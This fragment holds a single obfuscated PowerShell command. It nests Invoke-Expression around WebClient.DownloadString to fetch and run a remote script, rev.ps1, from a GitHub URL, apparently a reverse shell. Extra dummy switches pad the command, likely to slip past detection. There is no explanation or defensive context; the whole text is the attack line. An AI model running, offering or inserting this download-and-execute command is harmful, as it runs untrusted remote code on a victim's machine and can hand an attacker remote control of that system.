...
iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire “iex(New-Object System.Net.WebClient).DownloadString(‘https://github.com/srothlisberger6361/rev/raw/main/rev.ps1')”
